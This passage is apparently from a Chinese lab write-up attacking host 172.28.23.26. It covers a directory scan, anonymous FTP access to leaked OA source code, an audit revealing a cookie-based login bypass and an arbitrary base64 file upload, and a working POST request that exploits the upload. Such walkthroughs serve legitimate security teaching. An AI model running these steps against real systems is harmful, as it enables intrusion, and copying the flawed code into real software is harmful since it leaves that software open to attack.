<p>在借助二进制程序的漏洞拿到 root shell 之后，在 <code>/root</code> 目录中可以找到 flag</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{6a326f94-6526-4586-8233-152d137281fd}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172282326-信息泄露">172.28.23.26 信息泄露<a href="#172282326-信息泄露" class="hash-link" aria-label="172.28.23.26 信息泄露的直接链接" title="172.28.23.26 信息泄露的直接链接">​</a></h2>
<p>尝试访问</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240827-142742-ef13c6580ff7dc8f615886924aa0e376.png" width="1577" height="1140" class="img_ev3q"></p>
<p>首先尝试目录扫描</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ dirsearch </span><span class="token parameter variable" style="color:#36acaa">--proxy</span><span class="token plain"> socks5://139.*.*.*:10000 </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> http://172.28.23.26 </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:13:56</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Starting:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:14:00</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -    6KB - /.DS_Store</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:14:40</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -    0B  - /checklogin.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:14:47</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -    3B  - /db.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:14:49</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -  532B  - /download/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:15:09</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -  722B  - /manage/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:15:42</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -  527B  - /system/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:15:47</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -   61B  - /upfile.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:15:47</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -  546B  - /upload/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:15:47</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> -   50B  - /upload.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>未发现存在有可利用点</p>
<p>结合 <code>fscan</code> 扫描得到的 <code>ftp 172.28.23.26:21:anonymous</code> 记录来看，可能 ftp 存在有信息泄露</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 </span><span class="token function" style="color:#d73a49">ftp</span><span class="token plain"> anonymous@172.28.23.26 </span><span class="token number" style="color:#36acaa">21</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> config </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> DLL init: proxychains-ng </span><span class="token number" style="color:#36acaa">4.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10000  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26:21  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connected to </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">220</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">vsFTPd </span><span class="token number" style="color:#36acaa">3.0</span><span class="token plain">.3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">331</span><span class="token plain"> Please specify the password.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">230</span><span class="token plain"> Login successful.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Remote system </span><span class="token builtin class-name">type</span><span class="token plain"> is UNIX.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Using binary mode to transfer files.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ftp</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">229</span><span class="token plain"> Entering Extended Passive Mode </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">||</span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">10835</span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10000  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26:10835  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">150</span><span class="token plain"> Here comes the directory listing.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r--    </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">        </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">         </span><span class="token number" style="color:#36acaa">7536672</span><span class="token plain"> Mar </span><span class="token number" style="color:#36acaa">23</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">23</span><span class="token plain">:56 OASystem.zip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将 <code>OASystem.zip</code> 文件下载下来之后，在其中发现 OA 系统的源码</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240828-142815-1d397aabb9d677246bc394a036f9bc40.png" width="2560" height="1540" class="img_ev3q"></p>
<p>对源码进行审计，发现登录逻辑存在有漏洞</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">checklogin.php</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token delimiter important">&lt;?php</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">islogin</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">isset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;id&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token keyword" style="color:#00009f">isset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;loginname&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token keyword" style="color:#00009f">isset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;jueseid&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token keyword" style="color:#00009f">isset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;danweiid&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token keyword" style="color:#00009f">isset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;quanxian&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;id&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">!=</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&#x27;</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;loginname&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">!=</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&#x27;</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;jueseid&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">!=</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&#x27;</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;danweiid&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">!=</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&#x27;</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token variable" style="color:#36acaa">$_COOKIE</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;quanxian&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">!=</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token constant boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token constant boolean" style="color:#36acaa">false</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token constant boolean" style="color:#36acaa">false</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token delimiter important">?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以发现，只需要将几个 <code>_COOKIE</code> 属性的值不为空，就可以直接过登录</p>
<p>同时，发现任意文件上传的漏洞</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">uploadbase64.php</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token delimiter important">&lt;?php</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$img</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$_POST</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;imgbase64&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">preg_match</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$img</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$result</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$type</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string double-quoted-string" style="color:#e3116c">&quot;.&quot;</span><span class="token operator" style="color:#393A34">.</span><span class="token variable" style="color:#36acaa">$result</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$path</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string double-quoted-string" style="color:#e3116c">&quot;upload/&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">.</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">date</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string double-quoted-string" style="color:#e3116c">&quot;Y-m-d&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">.</span><span class="token plain"> </span><span class="token string double-quoted-string" style="color:#e3116c">&quot;-&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">.</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">uniqid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">.</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$type</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$img</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">  </span><span class="token function" style="color:#d73a49">base64_decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">str_replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$result</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$img</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@</span><span class="token function" style="color:#d73a49">file_put_contents</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$path</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$img</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;{&quot;src&quot;:&quot;&#x27;</span><span class="token operator" style="color:#393A34">.</span><span class="token variable" style="color:#36acaa">$path</span><span class="token operator" style="color:#393A34">.</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&quot;}&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以直接尝试利用</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">POST /uploadbase64.php HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: 172.28.23.26</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Language: zh-CN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Upgrade-Insecure-Requests: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Encoding: gzip, deflate, br</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection: keep-alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: application/x-www-form-urlencoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Length: 40</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">imgbase64=data:image/png;base64,dGVzdA==</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240833-143346-fbb2d00817af4fac1b55be76a05105d5.png" width="2378" height="1390" class="img_ev3q"></p>
<p>测试一下，目标文件的内容确实为 <code>test</code></p>
